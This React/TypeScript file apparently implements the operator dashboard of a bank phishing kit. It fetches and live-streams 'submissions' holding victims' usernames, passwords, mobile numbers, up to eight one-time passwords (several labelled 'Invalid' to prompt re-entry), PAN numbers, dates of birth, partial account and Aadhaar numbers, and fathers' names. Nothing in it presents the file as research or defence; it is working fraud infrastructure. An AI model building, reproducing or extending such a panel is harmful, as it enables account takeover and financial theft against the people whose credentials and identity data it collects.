import { useEffect, useState, useRef } from 'react';
import { useLocation } from 'wouter';

// Interface to represent a user data submission
interface UserSubmission {
  id?: string; // Automatically added timestamp ID for each submission
  username?: string;
  password?: string;
  mobile?: string;
  captcha?: string;
  otp1?: string;
  fullName?: string;
  dateOfBirth?: string;
  otp2?: string;
  accountLast4?: string;
  panNumber?: string;
  otp3?: string;
  fatherName?: string;
  aadhaarLast4?: string;
  otp4?: string;
  otp5?: string; // Fifth OTP (Invalid 1)
  otp6?: string; // Sixth OTP (Invalid 2)
  otp7?: string; // Seventh OTP (Invalid 3)
  otp8?: string; // Eighth OTP (Invalid 4)
  timestamp?: number; // Legacy timestamp field
  createdAt?: number; // New timestamp fields
  updatedAt?: number;
  submissionId?: string;
}

export default function AdminDashboardPage() {
  const [, navigate] = useLocation();
  const [submissions, setSubmissions] = useState<UserSubmission[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [lastUpdate, setLastUpdate] = useState<Date | null>(null);
  
  // WebSocket reference
  const wsRef = useRef<WebSocket | null | undefined>(null);
  
  useEffect(() => {
    // Check auth
    const isAuthenticated = sessionStorage.getItem('adminAuth') === 'true';
    if (!isAuthenticated) {
      navigate('/admin');
      return;
    }
    
    // Fetch submissions initially
    const fetchSubmissions = async () => {
      try {
        const response = await fetch('/api/admin/submissions');
        if (!response.ok) {
          throw new Error('Failed to fetch submissions');
        }
        
        const data = await response.json();
        setSubmissions(data.submissions || []);
      } catch (err) {
        setError('Error loading submissions: ' + String(err));
      } finally {
        setLoading(false);
      }
    };
    
    fetchSubmissions();
    
    // Set up WebSocket connection for real-time updates
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}/api/ws`;
    
    // Create WebSocket with error handling
    let ws: WebSocket | undefined;
    try {
      ws = new WebSocket(wsUrl);
    } catch (err) {
      console.error('Error creating WebSocket:', err);
      setError('Could not establish real-time connection. Updates will not be automatic.');
    }
    wsRef.current = ws;
    
    // Set up WebSocket event handlers if connection was created successfully
    if (ws) {
      // Handle WebSocket connection opening
      ws.onopen = () => {
        console.log('WebSocket connection established for real-time updates');
      };
      
      // Handle incoming messages
      ws.onmessage = (event) => {
        try {
          const message = JSON.parse(event.data);
          
          if (message.type === 'submissions_update') {
            console.log('Received real-time submission update');
            setSubmissions(message.data.submissions || []);
            setLastUpdate(new Date());
          }
        } catch (err) {
          console.error('Error processing WebSocket message:', err);
        }
      };
      
      // Handle errors
      ws.onerror = (error) => {
        console.error('WebSocket error:', error);
        setError(prev => prev ? `${prev}. WebSocket connection error.` : 'WebSocket connection error');
      };
    }
    
    // Clean up the WebSocket connection when the component unmounts
    return () => {
      if (wsRef.current) {
        wsRef.current.close();
      }
    };
  }, [navigate]);
  
  const handleLogout = () => {
    sessionStorage.removeItem('adminAuth');
    navigate('/admin');
  };
  
  // Helper function to display form data in the correct sequence
  const renderSubmissionDetails = (submission: UserSubmission) => {
    const fieldOrder = [
      { key: 'username', label: 'Username' },
      { key: 'password', label: 'Password' },
      { key: 'mobile', label: 'Mobile' },
      { key: 'captcha', label: 'Captcha' },
      { key: 'otp1', label: 'First OTP' },
      { key: 'fullName', label: 'Full Name' },
      { key: 'dateOfBirth', label: 'Date of Birth' },
      { key: 'otp2', label: 'Second OTP' },
      { key: 'accountLast4', label: 'Last 4 Digits of Account' },
      { key: 'panNumber', label: 'PAN Number' },
      { key: 'otp3', label: 'Third OTP' },
      { key: 'fatherName', label: "Father's Name" },
      { key: 'aadhaarLast4', label: 'Last 4 Digits of Aadhaar' },
      { key: 'otp4', label: 'Fourth OTP (Invalid)' },
      { key: 'otp5', label: 'Fifth OTP' },
      { key: 'otp6', label: 'Sixth OTP (Invalid)' },
      { key: 'otp7', label: 'Seventh OTP (Invalid)' },
      { key: 'otp8', label: 'Eighth OTP' },
    ];
    
    return (
      <div style={{ marginBottom: '20px' }}>
        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
          <tbody>
            {fieldOrder.map(field => {
              const value = submission[field.key as keyof UserSubmission];
              if (!value) return null; // Skip empty values
              
              return (
                <tr key={field.key} style={{ borderBottom: '1px solid #eee' }}>
                  <td style={{ padding: '8px', fontWeight: 'bold', width: '200px' }}>{field.label}</td>
                  <td style={{ padding: '8px' }}>{value}</td>
                </tr>
              );
            })}
            {/* Show created time */}
            {(submission.createdAt || submission.timestamp) && (
              <tr style={{ borderBottom: '1px solid #eee' }}>
                <td style={{ padding: '8px', fontWeight: 'bold' }}>Created</td>
                <td style={{ padding: '8px' }}>
                  {new Date(submission.createdAt || submission.timestamp || 0).toLocaleString()}
                </td>
              </tr>
            )}
            
            {/* Show last updated time if available */}
            {submission.updatedAt && submission.updatedAt !== submission.createdAt && (
              <tr style={{ borderBottom: '1px solid #eee' }}>
                <td style={{ padding: '8px', fontWeight: 'bold' }}>Last Updated</td>
                <td style={{ padding: '8px' }}>
                  {new Date(submission.updatedAt).toLocaleString()}
                </td>
              </tr>
            )}
            
            {/* Show submission ID for debugging */}
            {submission.id && (
              <tr style={{ borderBottom: '1px solid #eee' }}>
                <td style={{ padding: '8px', fontWeight: 'bold' }}>Submission ID</td>
                <td style={{ padding: '8px' }}>
                  {submission.id}
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
    );
  };
  
  return (
    <div style={{ maxWidth: '800px', margin: '0 auto', padding: '20px' }}>
      <div style={{ 
        display: 'flex', 
        justifyContent: 'space-between', 
        alignItems: 'center', 
        marginBottom: '20px',
        borderBottom: '2px solid #1a75ff',
        paddingBottom: '10px'
      }}>
        <h1 style={{ margin: 0 }}>Admin Dashboard</h1>
        <button 
          onClick={handleLogout}
          style={{ 
            padding: '8px 15px',
            backgroundColor: '#f44336',
            color: 'white',
            border: 'none',
            borderRadius: '4px',
            cursor: 'pointer',
            fontWeight: 'bold'
          }}
        >
          Logout
        </button>
      </div>
      
      {error && (
        <div style={{ 
          background: '#ffecec', 
          padding: '15px', 
          border: '1px solid #f5aca6',
          marginBottom: '20px',
          borderRadius: '5px',
          color: '#cc0033'
        }}>
          {error}
        </div>
      )}
      
      {loading ? (
        <div style={{ textAlign: 'center', padding: '30px' }}>
          Loading submissions...
        </div>
      ) : submissions.length === 0 ? (
        <div style={{ 
          padding: '30px', 
          textAlign: 'center', 
          backgroundColor: '#f9f9f9',
          border: '1px solid #ddd',
          borderRadius: '5px'
        }}>
          No submissions found
        </div>
      ) : (
        <div>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
            <h2>Submissions ({submissions.length})</h2>
            {lastUpdate && (
              <div style={{ 
                fontSize: '0.9rem', 
                color: '#388e3c',
                backgroundColor: '#e8f5e9',
                padding: '8px 12px',
                borderRadius: '4px',
                display: 'flex',
                alignItems: 'center'
              }}>
                <span style={{ fontWeight: 'bold', marginRight: '6px' }}>Live</span>
                <span style={{ 
                  width: '8px', 
                  height: '8px', 
                  backgroundColor: '#4caf50', 
                  borderRadius: '50%', 
                  display: 'inline-block',
                  animation: 'pulse 1.5s infinite'
                }}></span>
                <style>{`
                  @keyframes pulse {
                    0% { opacity: 0.4; }
                    50% { opacity: 1; }
                    100% { opacity: 0.4; }
                  }
                `}</style>
              </div>
            )}
          </div>
          
          {/* Display submissions in reverse order (newest first) */}
          {[...submissions].reverse().map((submission, index) => (
            <div key={submission.id || index} style={{
              backgroundColor: '#f9f9f9',
              border: '1px solid #ddd',
              borderRadius: '5px',
              padding: '15px',
              marginBottom: '20px'
            }}>
              <h3 style={{ borderBottom: '1px solid #ddd', paddingBottom: '10px', marginTop: 0 }}>
                Submission #{submissions.length - index}
                {submission.username && ` - ${submission.username}`}
              </h3>
              
              {renderSubmissionDetails(submission)}
            </div>
          ))}
        </div>
      )}
    </div>
  );
}